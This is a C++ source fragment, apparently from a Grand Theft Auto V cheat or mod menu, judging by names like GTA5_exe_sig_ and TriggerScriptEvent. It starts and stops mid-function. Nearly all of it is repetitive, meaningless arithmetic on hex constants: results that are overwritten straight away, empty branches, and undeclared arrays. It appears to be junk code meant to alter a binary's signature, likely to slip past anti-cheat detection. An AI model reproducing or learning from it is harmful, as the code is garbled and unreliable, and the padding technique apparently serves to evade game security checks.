					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					offset = (0xB1231 * 0xA) + 0xA12;
					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

					if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
					}
					else
					{
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					}
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
					a = 0.0f;
					b = 0.0f;
					if (GTA5_exe_sig_[4] > 50.0f)
					{
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					}
					a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
					a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
					a = 0.0f;
					a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					b = 0.0f;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
					}
					else
					{
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
						offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					}
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (5) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
					if (TriggerScriptEvent[4] > 50.0f)
					{
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
					}
					a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
					a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
					a = 0.0f;
					a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					b = 0.0f;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					offset = (0xB1231 * 0xA) + 0xA12;
					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

					if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
					}
					else
					{
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					}
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
					a = 0.0f;
					b = 0.0f;
					if (TriggerScriptEvent[4] > 50.0f)
					{
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
					}
					a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
					a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
					a = 0.0f;
					a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					b = 0.0f;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					istringstream tokenizer{ line };
					string token;
					while (getline(tokenizer, token, ':'))
					{
						if (offset > aaaaaa)
						{
							matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
							matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
							matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
							matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							matriz[7] = (0xB1231 * 0xA) + matriz[2];
							a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
						}
						else
						{
							offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
							offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
							offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
							offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
						if (matriz[4] > 50.0f)
						{
							matriz[4] = matriz[1];
						}
						a2 = (matriz[4]) / (2 * matriz[2]);
						a1 = (matriz[3] + (2)) / (2 * matriz[2]);
						offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (matriz[3] + (5)) / (2 * matriz[2]);
						aaaaaa = ponteiro * 2;
						a = 0.0f;
						a1 = (matriz[3] + (4)) / (2 * matriz[2]);
						b = 0.0f;
						matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
						matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
						matriz[4] = matriz[1];
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
						offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						a2 = (matriz[4] + (2)) / (2 * matriz[2]);
						offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > aaaaaa)
						{
						}
						else
							a1 = (matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (matriz[4] - (3)) / (2 * matriz[2]);

						if (matriz[1] > aaaaaa)
						{
							matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
							matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
							matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
							matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
							matriz[7] = (0xB1231 * 0xA) + matriz[2];
							a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
						}
						else
						{
							matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
							matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
							matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
							matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
							matriz[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						}
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
						a = 0.0f;
						b = 0.0f;
						if (matriz[4] > 50.0f)
						{
							matriz[4] = matriz[1];
						}
						a2 = (matriz[4]) / (2 * matriz[2]);
						a1 = (matriz[3] + (2)) / (2 * matriz[2]);
						matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (matriz[3] + (5)) / (2 * matriz[2]);
						aaaaaa = 0xB2 * 2;
						a = 0.0f;
						a1 = (matriz[3] + (4)) / (2 * matriz[2]);
						b = 0.0f;
						matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
						matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
						matriz[4] = matriz[1];
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
						matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						a2 = (matriz[4] + (2)) / (2 * matriz[2]);
						matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						if (matriz[1] > aaaaaa)
						{
						}
						else
							a1 = (matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (matriz[4] - (3)) / (2 * matriz[2]);

						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
							a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
						}
						else
						{
							offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
							offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
							offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
						if (GTA5_exe_sig_[4] > 50.0f)
						{
							GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						}
						a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
						a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
